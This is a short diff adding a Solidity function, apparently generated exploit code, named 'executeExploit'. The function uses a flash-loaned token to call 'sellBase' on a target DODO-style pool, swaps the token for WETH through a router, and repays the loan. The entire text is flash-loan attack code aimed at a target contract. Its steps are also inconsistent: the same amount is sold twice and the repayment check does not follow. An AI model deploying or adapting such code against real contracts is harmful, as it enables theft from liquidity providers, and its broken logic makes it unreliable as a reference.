@@ -1,0 +1,29 @@
+```plaintext
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start by using the borrowed valuableToken
+    valuableToken.approve(target, amount);
+    
+    // Call the sellBase function to sell the valuable token for WETH
+    IDPP(target).sellBase(address(this));
+    
+    // Now, we will swap valuableToken for WETH using the PancakeSwap router
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken);
+    path[1] = uniswapRouter.WETH();
+    
+    // Calculate the amount of WETH we can receive
+    uint[] memory amounts = uniswapRouter.getAmountsOut(amount, path);
+    
+    // Swap valuableToken for WETH
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, amounts[1], path, address(this), block.timestamp + 300);
+    
+    // Now we repay the flashloan
+    uint256 newBalance = valuableToken.balanceOf(address(this));
+    require(newBalance > amount, "Not enough tokens to repay flash loan");
+    
+    // Transfer the borrowed amount back to the flash loan provider
+    valuableToken.transfer(flashloanProvider, amount);
+}
+</executeExploitCode>
+```
